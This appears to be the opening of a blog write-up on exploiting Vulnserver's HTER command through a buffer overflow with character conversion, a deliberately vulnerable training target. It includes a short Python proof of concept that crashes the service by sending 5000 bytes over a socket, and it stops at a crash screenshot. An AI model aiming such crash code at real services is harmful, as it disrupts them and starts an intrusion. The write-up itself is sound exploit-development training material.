---
layout: post
title: Vulnserver HTER - Vanilla BOF & Character Conversion
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

# Introduction

### In order to finish with the eccentric cases that vulnserver may offer us, today we will be seeing an odd case of a buffer overflow with a character conversion, meaning that the received bytes are parsed as expected. Nonetheless, the alphanumeric bytes suffer from no change whatsoever and are not ported as hex. For example, if the EIP is overflown with 1000 bytes of A's, the EIP may not reveal 41414141, instead, it will place "AAAAAAAA".

### The basics

##### As with any other vulnerable applicaiton to a buffer overflow, we need to test it first in order to exploit it, let's try with HTER + long string of bytes.

###### PoC code:

```term
import socket, sys

host = sys.argv[1]

buffer = "HTER " + "A" * 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

#### Crash I

![](/assets/img/HTER/1.png)
